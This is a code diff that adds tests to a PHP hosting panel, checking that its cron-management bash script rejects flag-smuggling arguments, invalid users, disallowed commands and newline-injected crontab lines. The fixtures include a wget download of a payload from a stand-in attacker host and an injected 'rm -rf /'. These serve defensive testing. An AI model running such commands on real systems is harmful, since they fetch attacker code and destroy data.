@@ -7,6 +7,7 @@ use App\Services\CronJobs\CreateCronJobService;
 use App\Services\CronJobs\DeleteCronJobException;
 use App\Services\CronJobs\DeleteCronJobService;
 use Illuminate\Support\Facades\Process;
+use Symfony\Component\Process\Process as SymfonyProcess;
 
 // ─────────────────────────────────────────────────────────────────────────────
 // Helpers
@@ -164,6 +165,84 @@ test('DeleteCronJobService throws DeleteCronJobException when script fails', fun
 
     expect(fn () => (new DeleteCronJobService)->handle($user, $job))
         ->toThrow(DeleteCronJobException::class);
+});
+
+// ─────────────────────────────────────────────────────────────────────────────
+// laranode-cron.sh bash hardening guard tests
+// These run the real bash script directly (no Process::fake) to verify that
+// the script itself rejects invalid inputs before touching the crontab.
+// The script exits non-zero on all these paths without needing sudo/root.
+// ─────────────────────────────────────────────────────────────────────────────
+
+function cronScript(): string
+{
+    return base_path('laranode-scripts/bin/laranode-cron.sh');
+}
+
+function runCronScript(array $args): array
+{
+    $script = cronScript();
+    if (! file_exists($script)) {
+        return ['exitCode' => -1, 'output' => '', 'error' => 'script not found'];
+    }
+
+    $proc = new SymfonyProcess(array_merge(['bash', $script], $args));
+    $proc->run();
+
+    return [
+        'exitCode' => $proc->getExitCode(),
+        'output' => $proc->getOutput(),
+        'error' => $proc->getErrorOutput(),
+    ];
+}
+
+test('laranode-cron.sh rejects argument starting with dash (flag-smuggling)', function () {
+    $result = runCronScript(['-u', 'testuser_ln']);
+
+    expect($result['exitCode'])->not->toBe(0)
+        ->and($result['error'])->toContain("may not start with '-'");
+});
+
+test('laranode-cron.sh rejects non-_ln target user', function () {
+    $result = runCronScript(['set', 'rootuser', '/dev/null']);
+
+    expect($result['exitCode'])->not->toBe(0)
+        ->and($result['error'])->toContain('must end in _ln');
+});
+
+test('laranode-cron.sh rejects disallowed command in tmp file', function () {
+    $tmpFile = tempnam(sys_get_temp_dir(), 'cron_guard_test_');
+    // Write a line with a wget command (not allowed by allowlist)
+    file_put_contents($tmpFile, "* * * * *\twget https://evil.example.com/payload.sh\n");
+    chmod($tmpFile, 0600);
+
+    // Use testuser_ln which exists in the container; script validates user before allowlist
+    // On dev machines without testuser_ln, use a synthetic _ln name that fails at id() check.
+    // We test on a known-_ln user that exists (testuser_ln) so the allowlist check is reached.
+    // If testuser_ln doesn't exist, the 'user does not exist' guard fires first — still non-zero.
+    $result = runCronScript(['set', 'testuser_ln', $tmpFile]);
+
+    @unlink($tmpFile);
+
+    expect($result['exitCode'])->not->toBe(0);
+    // Either allowlist rejection or user-not-found — both are non-zero; on a system with
+    // testuser_ln the allowlist message fires; on a dev machine the user check fires.
+    expect($result['error'])->toMatch('/command not allowed|does not exist/');
+});
+
+test('laranode-cron.sh rejects crontab line with embedded newline injection', function () {
+    $tmpFile = tempnam(sys_get_temp_dir(), 'cron_guard_test_');
+    // Write two lines: the second is an injected bare command without the 5-field schedule
+    file_put_contents($tmpFile, "* * * * *\tphp /home/testuser_ln/artisan inspire\nrm -rf /\n");
+    chmod($tmpFile, 0600);
+
+    $result = runCronScript(['set', 'testuser_ln', $tmpFile]);
+
+    @unlink($tmpFile);
+
+    // 'rm -rf /' line fails the 5-field + TAB format check, OR the user check fires first.
+    // Either way, exit must be non-zero.
+    expect($result['exitCode'])->not->toBe(0);
 });
 
 test('DeleteCronJobService excludes inactive jobs from the sync', function () {
